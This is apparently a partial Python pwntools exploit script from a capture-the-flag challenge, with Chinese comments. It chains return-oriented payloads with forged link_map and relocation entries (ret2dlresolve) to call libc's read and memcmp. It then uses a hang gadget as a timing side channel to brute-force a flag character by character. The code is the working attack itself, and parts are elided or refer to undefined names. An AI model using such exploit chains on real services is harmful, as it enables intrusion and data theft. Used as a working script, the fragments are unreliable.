from pwn import *
import struct

# set rdi, rsi, rdx for read
pop_rdx_rsi_ret = 0x00000000001150c9    # libc 中的地址
goal_offset = pop_rdx_rsi_ret - libc.sym['__libc_start_main']

fake_link_map = faking_link_map(goal_offset, 
    bss_addr + 8 * 12 + 256 + 16 + 24, 
    bss_addr + 8 * 12
)
fake_rela = fake_Elf64_RELA(0x601fd0 - goal_offset)
fake_sym_addr = pelf.got["__libc_start_main"] - 8
link_map_addr = bss_addr + 8 * 12
fake_rela_addr = bss_addr + 8 * 12 + 256 + 16
flag_addr = pelf.bss() + 0x100
next_rop = bss_addr + 8 * 12 + 256 + 16 +24 + 16    # 下一条 ROP 的位置

payload3 = p64(0) * 3 + p64(pop_rdi_ret) + p64(fd)
payload3 += p64(plt0) + p64(link_map_addr) + p64(rel_offset)
payload3 += p64(0x100) + p64(flag_addr)  # pop_rdx_rsi
payload3 += p64(pop_rsp_ppp_ret) + p64(next_rop)     # return 

payload3 += fake_link_map + p64(0xdeadbeefdeadbeef) + p64(fake_rela_addr)
payload3 += fake_rela + p64(0xdeadbeefdeadbeef) + p64(fake_sym_addr)

##############################
# call read
bss_addr = next_rop
goal_offset = libc.sym['read'] - libc.sym['__libc_start_main']

fake_link_map = faking_link_map(goal_offset, 
    bss_addr + 8 * 8 + 256 + 16 + 24, 
    bss_addr + 8 * 8
)
fake_rela = fake_Elf64_RELA(0x601fd0 - goal_offset)
fake_sym_addr = pelf.got["__libc_start_main"] - 8
link_map_addr = bss_addr + 8 * 8
fake_rela_addr = bss_addr + 8 * 8 + 256 + 16
next_rop = bss_addr + 8 * 8 + 256 + 16 + 24 +16

payload4 = p64(0) * 3
payload4 += p64(plt0) + p64(link_map_addr) + p64(rel_offset)
payload4 += p64(pop_rsp_ppp_ret) + p64(next_rop)     # return 

payload4 += fake_link_map + p64(0xdeadbeefdeadbeef) + p64(fake_rela_addr)
payload4 += fake_rela + p64(0xdeadbeefdeadbeef) + p64(fake_sym_addr)





libc = ELF('./new_libc_x64.so.6')

feeb = next(libc.search("\xeb\xfe"))
print("0xfeeb in: " + hex(feeb))

# ... open, read ROP

##############################
# call memcmp
bss_addr = next_rop
goal_offset = libc.sym['memcmp'] - libc.sym['__libc_start_main'] + 0xdf880
fake_link_map = faking_link_map(goal_offset, 
    bss_addr + 8 * 8 + 256 + 16 + 24, 
    bss_addr + 8 * 8
)
fake_rela = fake_Elf64_RELA(0x601fd0 - goal_offset)
fake_sym_addr = pelf.got["__libc_start_main"] - 8
link_map_addr = bss_addr + 8 * 8
fake_rela_addr = bss_addr + 8 * 8 + 256 + 16
next_rop = bss_addr + 8 * 8 + 256 + 16 + 24 +16 + 60
test_rax = 0x0000000000400825

payload6 = p64(0) * 3
payload6 += p64(plt0) + p64(link_map_addr) + p64(rel_offset)
payload6 += p64(pop_rsp_ppp_ret) + p64(next_rop)

payload6 += fake_link_map + p64(0xdeadbeefdeadbeef) + p64(fake_rela_addr)
payload6 += fake_rela + p64(0xdeadbeefdeadbeef) + p64(fake_sym_addr)
payload6 += (myflag + j).ljust(60, '\x00')

# ##############################
bss_addr = next_rop
call_r12 = 0x0000000000400989
push_rax_pop_rbx_pp_ret = 0x00000000000acb0e #: push rax ; pop rbx ; pop rbp ; pop r12 ; ret

goal_offset = push_rax_pop_rbx_pp_ret - libc.sym['__libc_start_main']
fake_link_map7 = faking_link_map(goal_offset, 
    bss_addr + 8 * 9 + 8 * 6 + 256 + 16 + 24 + 16 + 256 + 16 + 24, 
    bss_addr + 8 * 9 + 8 * 6 + 256 + 16 + 24 + 16
)
fake_rela7 = fake_Elf64_RELA(0x601fd0 - goal_offset)
fake_sym_addr7 = pelf.got["__libc_start_main"] - 8
link_map_addr = bss_addr + 8 * 9 + 8 * 6 + 256 + 16 + 24 + 16
fake_rela_addr7 = bss_addr + 8 * 9 + 8 * 6 + 256 + 16 + 24 + 16 + 256 + 16 
next_rop = bss_addr + 8 * 9

payload7 = p64(0) * 3
payload7 += p64(plt0) + p64(link_map_addr) + p64(rel_offset)
payload7 += p64(0) + p64(next_rop)
payload7 += p64(call_r12)   # r12 == next_rop


##############################
# call 0xfeeb
bss_addr = next_rop
goal_offset = feeb - libc.sym['__libc_start_main']

fake_link_map = faking_link_map(goal_offset, 
    bss_addr + 8 * 6 + 256 + 16 + 24, 
    bss_addr + 8 * 6
)
fake_rela = fake_Elf64_RELA(0x601fd0 - goal_offset)
fake_sym_addr = pelf.got["__libc_start_main"] - 8
link_map_addr = bss_addr + 8 *6
fake_rela_addr = bss_addr + 8 * 6 + 256 + 16
next_rop = bss_addr + 8 * 6 + 256 + 16 + 24 +16
pop2_ret = 0x00000000004009a0 # : pop r14 ; pop r15 ; ret

payload8 = p64(pop2_ret)
payload8 += p64(plt0) + p64(link_map_addr) + p64(rel_offset)
payload8 += p64(pop_rsp_ppp_ret) + p64(next_rop)     # return 

payload8 += fake_link_map + p64(0xdeadbeefdeadbeef) + p64(fake_rela_addr)
payload8 += fake_rela + p64(0xdeadbeefdeadbeef) + p64(fake_sym_addr)


######################
payload7_2 = fake_link_map7 + p64(0xdeadbeefdeadbeef) + p64(fake_rela_addr7)
payload7_2 += fake_rela7 + p64(0xdeadbeefdeadbeef) + p64(fake_sym_addr7)

# ... something
p.send(payload)
sleep(0.3)

try:
    p.recv(3, timeout=3)    # 这里注意使用 recv 而非 send
    myflag += j
    flag_len += 1
    is_ok = True
    print("flag: " + myflag)
    p.close()
    if j == '}':
        print("over...")
        raw_input()
    break
except:
    p.close()